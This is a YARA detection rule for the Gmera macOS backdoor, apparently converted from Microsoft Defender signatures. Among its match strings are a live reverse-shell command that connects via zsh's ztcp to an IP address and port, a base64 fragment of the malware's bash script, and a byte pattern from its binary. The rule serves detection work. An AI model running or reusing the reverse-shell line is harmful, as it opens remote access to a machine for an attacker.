rule Backdoor_MacOS_Gmera_A_2147783473_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:MacOS/Gmera.A!MTB"
        threat_id = "2147783473"
        type = "Backdoor"
        platform = "MacOS: "
        family = "Gmera"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACHOHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "starterapp" ascii //weight: 1
        $x_1_2 = "zmodload zsh/net/tcp && ztcp 193.37.214.34 25734 && zsh" ascii //weight: 1
        $x_1_3 = {05 bd 4e 00 00 48 b9 65 63 68 6f 20 27 00 00 48 89 0c 07 48 b9 00 00 00 00 00 00 00 e6 48 89 4c 07 08 48 8b 05 a1 4e 00 00 48 b9 12 00 00 00 00 00 00 d0 48 89 0c 07 48 8d 15 34 21 00 00 48 be 00 00 00 00 00 00 00 80 48 09 f2 48 89 54 07 08 48 8b 05 7b 4e 00 00 48 81 c1 7e 0b 00 00 48 89 0c 07 48 8d 0d 29 21 00 00 48 09 f1 48 89 4c 07 08 e8 2c 00 00 00 48 89 5d e8 48 89 45 f0}  //weight: 1, accuracy: High
        $x_2_4 = "IyEgL2Jpbi9iYXNoCgpmdW5jdGlvbiByZW1vdmVfc3BlY19jaGFyKCl7CiAgICBlY2hvICIkMSIgfCB0ciAtZGMgJ1s6YWxudW06XS5ccicgfCB0ciAnWzp1cHBlcjpdJyAnWzpsb3dlcjpdJwp9Cgp3aG9hbWk9IiQocmVtb3ZlX3NwZWNfY2hhciBgd2hvYW1pYCkiCm" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

